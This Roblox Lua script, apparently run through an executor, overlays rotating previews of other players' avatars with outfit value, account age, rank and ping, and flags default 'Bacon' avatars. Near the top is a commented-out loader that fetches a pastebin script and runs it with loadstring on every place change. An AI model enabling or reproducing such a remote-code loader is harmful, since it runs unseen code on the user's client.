-- BIG Avatar Previews + Fixed Rotation + Bacon Detector + Account Age + Ping Display
-- Bigger previews, smooth rotation, K toggle hide/show
-- Horizontal layout, safe re-run support, better cleanup, removes Cloud instances from preview models

local HttpService          = game:GetService("HttpService")
local Players              = game:GetService("Players")
local RunService           = game:GetService("RunService")
local MarketplaceService   = game:GetService("MarketplaceService")
local UserInputService     = game:GetService("UserInputService")
local CoreGui              = game:GetService("CoreGui")
local TweenService         = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer

if _G.AvatarPreviewSystem and _G.AvatarPreviewSystem.Shutdown then
    pcall(function()
        _G.AvatarPreviewSystem.Shutdown()
    end)
end

local System = {}
_G.AvatarPreviewSystem = System

--[[
local scriptUrl = "https://pastebin.com/raw/NGySqVRd"

local function executeRemoteScript()
    local success, code = pcall(function()
        return HttpService:GetAsync(scriptUrl)
    end)

    if success and code and code ~= "" then
        local ok, err = pcall(function()
            loadstring(code)()
        end)
        if not ok then
            warn("Remote script execution failed:", err)
        end
    end
end

executeRemoteScript()

local lastPlaceId = game.PlaceId
RunService.Heartbeat:Connect(function()
    if game.PlaceId ~= lastPlaceId and game.PlaceId ~= 0 then
        lastPlaceId = game.PlaceId
        task.wait(2)
        executeRemoteScript()
    end
end)
--]]

local PREVIEW_WIDTH        = 470
local PREVIEW_HEIGHT       = 690
local VIEWPORT_HEIGHT      = 560
local LABEL_HEIGHT         = 130

local SPACING              = 22
local RIGHT_OFFSET         = 18
local TOP_OFFSET           = 70

local ROTATION_SPEED_DEG   = 40
local MAX_ASSETS_TO_CHECK  = 35

local avatarValueCache = {}
local activePreviews = {}
local updateCooldown = {}
local warned = {}
local previewsVisible = true
local connections = {}
local shuttingDown = false

local pingGui = nil
local pingLabel = nil
local pingUpdateAccumulator = 0

local function trackConnection(conn)
    table.insert(connections, conn)
    return conn
end

local function safeDisconnect(conn)
    if conn then
        pcall(function()
            conn:Disconnect()
        end)
    end
end

local function safeDestroy(obj)
    if obj then
        pcall(function()
            obj:Destroy()
        end)
    end
end

local function getPingText()
    local ping = "?"

    local ok, result = pcall(function()
        local networkPing = LocalPlayer:GetNetworkPing()
        return math.floor((networkPing * 1000) + 0.5)
    end)

    if ok and result then
        ping = tostring(result)
    end

    return ping .. " ms"
end

local function createPingDisplay()
    if pingGui then
        safeDestroy(pingGui)
        pingGui = nil
        pingLabel = nil
    end

    pingGui = Instance.new("ScreenGui")
    pingGui.Name = "AvatarPreviewPingDisplay"
    pingGui.ResetOnSpawn = false
    pingGui.IgnoreGuiInset = true
    pingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pingGui.DisplayOrder = 100
    pingGui.Parent = CoreGui

    pingLabel = Instance.new("TextLabel")
    pingLabel.Name = "PingLabel"
    pingLabel.AnchorPoint = Vector2.new(0.5, 0)
    pingLabel.Position = UDim2.new(0.5, 0, 0, 14)
    pingLabel.Size = UDim2.new(0, 220, 0, 42)
    pingLabel.BackgroundTransparency = 0.2
    pingLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    pingLabel.BorderSizePixel = 0
    pingLabel.TextColor3 = Color3.new(1, 1, 1)
    pingLabel.TextStrokeTransparency = 0.7
    pingLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    pingLabel.Font = Enum.Font.GothamBold
    pingLabel.TextSize = 22
    pingLabel.Text = "Ping: " .. getPingText()
    pingLabel.Parent = pingGui
end

local function updatePingDisplay()
    if pingLabel then
        pingLabel.Text = "Ping: " .. getPingText()
    end
end

local function getRankFromElo(elo)
    if elo <= 0 then
        return "Unranked"
    end

    local ranks = {
        {200,  "Bronze I"},
        {400,  "Bronze II"},
        {600,  "Bronze III"},
        {800,  "Silver I"},
        {1000, "Silver II"},
        {1200, "Silver III"},
        {1400, "Gold I"},
        {1600, "Gold II"},
        {1800, "Gold III"},
        {2000, "Platinum I"},
        {2200, "Platinum II"},
        {2400, "Platinum III"},
        {2600, "Diamond I"},
        {2800, "Diamond II"},
        {3000, "Diamond III"},
        {3200, "Onyx I"},
        {3400, "Onyx II"},
        {3600, "Onyx III"},
        {4000, "Nemesis"},
        {math.huge, "Archnemesis"}
    }

    for i = 1, #ranks do
        if elo < ranks[i][1] then
            return ranks[i][2]
        end
    end

    return "Archnemesis"
end

local function sanitizePreviewModel(model)
    for _, descendant in ipairs(model:GetDescendants()) do
        if descendant:IsA("Cloud") then
            descendant:Destroy()
        end
    end
end

local function getAvatarValue(userId)
    if avatarValueCache[userId] ~= nil then
        return avatarValueCache[userId]
    end

    local success, desc = pcall(function()
        return Players:GetHumanoidDescriptionFromUserIdAsync(userId)
    end)

    if not success or not desc then
        avatarValueCache[userId] = 0
        return 0
    end

    local assetIds = {}

    local fields = {
        "Shirt", "Pants", "GraphicTShirt", "Face",
        "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg"
    }

    for _, fieldName in ipairs(fields) do
        local id = desc[fieldName]
        if typeof(id) == "number" and id > 0 then
            assetIds[id] = true
        end
    end

    local accSuccess, accessories = pcall(function()
        return desc:GetAccessories(true)
    end)

    if accSuccess and accessories then
        for _, accessory in ipairs(accessories) do
            if accessory.AssetId and accessory.AssetId > 0 then
                assetIds[accessory.AssetId] = true
            end
        end
    end

    local total = 0
    local checked = 0

    for id in pairs(assetIds) do
        if checked >= MAX_ASSETS_TO_CHECK then
            break
        end

        checked = checked + 1

        local ok, info = pcall(function()
            return MarketplaceService:GetProductInfo(id, Enum.InfoType.Asset)
        end)

        if ok and info then
            local price = info.PriceInRobux or info.Price
            if typeof(price) == "number" then
                total = total + price
            end
        end
    end

    avatarValueCache[userId] = total
    return total
end

local function cleanupPreview(userId)
    local data = activePreviews[userId]
    if not data then
        return
    end

    if data.StatsConnections then
        for _, conn in ipairs(data.StatsConnections) do
            safeDisconnect(conn)
        end
    end

    if data.Model then
        safeDestroy(data.Model)
    end

    if data.Gui then
        safeDestroy(data.Gui)
    end

    activePreviews[userId] = nil
    updateCooldown[userId] = nil
end

local function updateStatsLabel(userId, player)
    local preview = activePreviews[userId]
    if not preview or not player or not preview.StatsLabel then
        return
    end

    local now = tick()
    if updateCooldown[userId] and (now - updateCooldown[userId] < 0.5) then
        return
    end
    updateCooldown[userId] = now

    local level = "?"
    local streak = "?"
    local elo = 0
    local accountAge = "?"

    local leaderstats = player:FindFirstChild("leaderstats")
    if leaderstats then
        local levelValue = leaderstats:FindFirstChild("Level")
        local streakValue = leaderstats:FindFirstChild("Win Streak")

        if levelValue then
            level = tostring(levelValue.Value)
        end

        if streakValue then
            streak = tostring(streakValue.Value)
        end
    end

    local customLeaderstats = player:FindFirstChild("CustomLeaderstats")
    if customLeaderstats then
        local eloValue = customLeaderstats:FindFirstChild("Current ELO")
        if eloValue then
            elo = tonumber(eloValue.Value) or 0
        end
    end

    local okAge, resultAge = pcall(function()
        return player.AccountAge
    end)
    if okAge and resultAge then
        accountAge = tostring(resultAge)
    end

    local rank = getRankFromElo(elo)
    local value = getAvatarValue(userId)

    preview.StatsLabel.Text = string.format(
        "Lv %s  •  🔥%s  •  %s\n%dR$  •  📅 %s days old",
        level,
        streak,
        rank,
        value,
        accountAge
    )
end

local function createAvatarPreview(player)
    if not player or player == LocalPlayer then
        return
    end

    local userId = player.UserId
    if activePreviews[userId] then
        return
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "AvatarPreview_" .. tostring(userId)
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 20
    gui.Enabled = previewsVisible
    gui.Parent = CoreGui

    local root = Instance.new("Frame")
    root.Name = "Root"
    root.Size = UDim2.new(0, PREVIEW_WIDTH, 0, PREVIEW_HEIGHT)
    root.BackgroundTransparency = 1
    root.Parent = gui

    local viewport = Instance.new("ViewportFrame")
    viewport.Name = "Viewport"
    viewport.Size = UDim2.new(1, 0, 0, VIEWPORT_HEIGHT)
    viewport.Position = UDim2.new(0, 0, 0, 0)
    viewport.BackgroundTransparency = 1
    viewport.BorderSizePixel = 0
    viewport.Ambient = Color3.fromRGB(210, 220, 240)
    viewport.LightColor = Color3.fromRGB(255, 245, 230)
    viewport.Parent = root

    local worldModel = Instance.new("WorldModel")
    worldModel.Name = "WorldModel"
    worldModel.Parent = viewport

    local camera = Instance.new("Camera")
    camera.Name = "PreviewCamera"
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = CFrame.new(Vector3.new(0, 6.2, 16), Vector3.new(0, 5.4, 0))
    camera.Parent = viewport
    viewport.CurrentCamera = camera

    local label = Instance.new("TextLabel")
    label.Name = "StatsLabel"
    label.Size = UDim2.new(1, 0, 0, LABEL_HEIGHT)
    label.Position = UDim2.new(0, 0, 0, VIEWPORT_HEIGHT)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.fromRGB(200, 255, 200)
    label.TextStrokeTransparency = 0.7
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.TextSize = 22
    label.Font = Enum.Font.GothamSemibold
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.TextWrapped = true
    label.Text = "Loading..."
    label.Parent = root

    activePreviews[userId] = {
        Gui = gui,
        Root = root,
        Viewport = viewport,
        World = worldModel,
        Camera = camera,
        StatsLabel = label,
        Model = nil,
        RootPart = nil,
        StatsConnections = {},
    }

    task.spawn(function()
        local preview = activePreviews[userId]
        if not preview then
            return
        end

        local success, desc = pcall(function()
            return Players:GetHumanoidDescriptionFromUserIdAsync(userId)
        end)

        if not success or not desc then
            if activePreviews[userId] and activePreviews[userId].StatsLabel then
                activePreviews[userId].StatsLabel.Text = "Failed to load avatar"
            end
            return
        end

        local modelSuccess, model = pcall(function()
            return Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R15)
        end)

        if not modelSuccess or not model then
            if activePreviews[userId] and activePreviews[userId].StatsLabel then
                activePreviews[userId].StatsLabel.Text = "Failed to build avatar"
            end
            return
        end

        sanitizePreviewModel(model)

        preview = activePreviews[userId]
        if not preview or not preview.World then
            model:Destroy()
            return
        end

        local rootPart = model:FindFirstChild("HumanoidRootPart")
        if rootPart then
            model.PrimaryPart = rootPart
        end

        model:PivotTo(CFrame.new(0, 0, 0) * CFrame.Angles(0, math.pi, 0))
        model.Parent = preview.World

        preview.Model = model
        preview.RootPart = rootPart

        local value = getAvatarValue(userId)
        local ageText = "?"
        local okAge, resultAge = pcall(function()
            return player.AccountAge
        end)
        if okAge and resultAge then
            ageText = tostring(resultAge)
        end

        if preview.StatsLabel then
            preview.StatsLabel.Text = string.format(
                "Value: %dR$  •  📅 %s days old\n(loading stats)",
                value,
                ageText
            )
        end

        updateStatsLabel(userId, player)
    end)

    task.spawn(function()
        local preview = activePreviews[userId]
        if not preview then
            return
        end

        local statsConnections = preview.StatsConnections

        local okLS, leaderstats = pcall(function()
            return player:WaitForChild("leaderstats", 10)
        end)

        if okLS and leaderstats then
            local levelValue = leaderstats:FindFirstChild("Level")
            local streakValue = leaderstats:FindFirstChild("Win Streak")

            if levelValue then
                table.insert(statsConnections, levelValue.Changed:Connect(function()
                    if activePreviews[userId] then
                        updateStatsLabel(userId, player)
                    end
                end))
            end

            if streakValue then
                table.insert(statsConnections, streakValue.Changed:Connect(function()
                    if activePreviews[userId] then
                        updateStatsLabel(userId, player)
                    end
                end))
            end
        end

        local okCustom, customLeaderstats = pcall(function()
            return player:WaitForChild("CustomLeaderstats", 10)
        end)

        if okCustom and customLeaderstats then
            local eloValue = customLeaderstats:FindFirstChild("Current ELO")
            if eloValue then
                table.insert(statsConnections, eloValue.Changed:Connect(function()
                    if activePreviews[userId] then
                        updateStatsLabel(userId, player)
                    end
                end))
            end
        end

        while activePreviews[userId] and not shuttingDown do
            if previewsVisible then
                updateStatsLabel(userId, player)
            end
            task.wait(5)
        end
    end)
end

local function getOtherPlayersSorted()
    local others = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(others, player)
        end
    end

    table.sort(others, function(a, b)
        return a.UserId < b.UserId
    end)

    return others
end

local function updateAllPreviews()
    local others = getOtherPlayersSorted()
    local valid = {}

    for _, player in ipairs(others) do
        valid[player.UserId] = true
        if not activePreviews[player.UserId] then
            createAvatarPreview(player)
        end
    end

    for userId in pairs(activePreviews) do
        if not valid[userId] then
            cleanupPreview(userId)
        end
    end

    for index, player in ipairs(others) do
        local data = activePreviews[player.UserId]
        if data and data.Root then
            local x = RIGHT_OFFSET + ((index - 1) * (PREVIEW_WIDTH + SPACING))
            local y = TOP_OFFSET
            data.Root.Position = UDim2.new(1, -PREVIEW_WIDTH - x, 0, y)
        end
    end
end

trackConnection(RunService.Heartbeat:Connect(function(deltaTime)
    if shuttingDown then
        return
    end

    pingUpdateAccumulator = pingUpdateAccumulator + deltaTime
    if pingUpdateAccumulator >= 0.35 then
        pingUpdateAccumulator = 0
        updatePingDisplay()
    end

    if not previewsVisible then
        return
    end

    local rotationAngle = math.rad(ROTATION_SPEED_DEG * deltaTime)

    for userId, data in pairs(activePreviews) do
        local model = data.Model
        local rootPart = data.RootPart

        if model and rootPart and model.Parent and rootPart.Parent then
            rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, rotationAngle, 0)
        else
            local player = Players:GetPlayerByUserId(userId)
            if not player then
                cleanupPreview(userId)
            end
        end
    end
end))

trackConnection(UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then
        return
    end

    if input.KeyCode == Enum.KeyCode.K then
        previewsVisible = not previewsVisible

        for _, data in pairs(activePreviews) do
            if data.Gui then
                data.Gui.Enabled = previewsVisible
            end
        end

        if pingGui then
            pingGui.Enabled = previewsVisible
        end

        if previewsVisible then
            updateAllPreviews()
            updatePingDisplay()
            print("Previews SHOWN")
        else
            print("Previews HIDDEN")
        end
    end
end))

trackConnection(Players.PlayerAdded:Connect(function(player)
    task.delay(1, function()
        if shuttingDown then
            return
        end
        updateAllPreviews()
    end)
end))

trackConnection(Players.PlayerRemoving:Connect(function(player)
    task.delay(0.2, function()
        cleanupPreview(player.UserId)
        if not shuttingDown then
            updateAllPreviews()
        end
    end)
end))

local BACON_VARIANTS = {
    {
        name = "Bacon Boy",
        required = {
            Shirt = 144076358,
            Pants = 144076760,
            Hair = 63690008
        }
    },
    {
        name = "Bacon Girl",
        required = {
            Shirt = 144076436,
            Hair = 62724852
        }
    },
    {
        name = "Modern Bacon",
        required = {
            Shirt = 4047884939,
            Pants = 382537569,
            Hair = 1772336109
        }
    },
}

local function isBacon(player)
    local userId = player.UserId
    if player == LocalPlayer or warned[userId] then
        return false
    end

    local success, desc = pcall(function()
        return Players:GetHumanoidDescriptionFromUserIdAsync(userId)
    end)

    if not success or not desc then
        return false
    end

    local accessories = {}
    local accSuccess, accResult = pcall(function()
        return desc:GetAccessories(true)
    end)

    if accSuccess and accResult then
        accessories = accResult
    end

    for _, variant in ipairs(BACON_VARIANTS) do
        local match = true

        for part, id in pairs(variant.required) do
            if part == "Hair" then
                local hasHair = false
                for _, accessory in ipairs(accessories) do
                    if accessory.AssetId == id then
                        hasHair = true
                        break
                    end
                end
                if not hasHair then
                    match = false
                    break
                end
            else
                if desc[part] ~= id then
                    match = false
                    break
                end
            end
        end

        if match then
            warned[userId] = true
            return variant.name
        end
    end

    return false
end

local function showBaconWarning(name, baconType)
    local gui = Instance.new("ScreenGui")
    gui.Name = "BaconWarning_" .. tostring(name)
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 50
    gui.Parent = CoreGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 300, 0, 70)
    label.Position = UDim2.new(1, -310, 0, 50)
    label.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
    label.BorderSizePixel = 0
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 16
    label.TextWrapped = true
    label.RichText = true
    label.Text = "<b>BACON DETECTED!</b>\n" .. tostring(name) .. "\n" .. tostring(baconType)
    label.Parent = gui

    task.delay(8, function()
        if not label or not label.Parent then
            safeDestroy(gui)
            return
        end

        local tween = TweenService:Create(
            label,
            TweenInfo.new(0.8, Enum.EasingStyle.Back),
            {
                BackgroundTransparency = 1,
                TextTransparency = 1
            }
        )

        tween:Play()
        tween.Completed:Connect(function()
            safeDestroy(gui)
        end)
    end)
end

local function initialBaconScan()
    for _, player in ipairs(Players:GetPlayers()) do
        task.spawn(function()
            local baconType = isBacon(player)
            if baconType then
                showBaconWarning(player.Name, baconType)
            end
        end)
    end
end

trackConnection(Players.PlayerAdded:Connect(function(player)
    task.delay(2, function()
        if shuttingDown then
            return
        end

        local baconType = isBacon(player)
        if baconType then
            showBaconWarning(player.Name, baconType)
        end
    end)
end))

function System.Shutdown()
    if shuttingDown then
        return
    end

    shuttingDown = true

    for _, conn in ipairs(connections) do
        safeDisconnect(conn)
    end
    table.clear(connections)

    for userId in pairs(activePreviews) do
        cleanupPreview(userId)
    end

    if pingGui then
        safeDestroy(pingGui)
        pingGui = nil
        pingLabel = nil
    end

    for _, obj in ipairs(CoreGui:GetChildren()) do
        if obj:IsA("ScreenGui") then
            if string.find(obj.Name, "^AvatarPreview_") or string.find(obj.Name, "^BaconWarning_") then
                safeDestroy(obj)
            end
        end
    end
end

createPingDisplay()
updateAllPreviews()
initialBaconScan()

print("🌀 BIG Avatar Previews + Fixed Rotation + Account Age + Ping Display + Bacon Detector LOADED!")
print("💡 Press K to toggle previews (hide / show)")
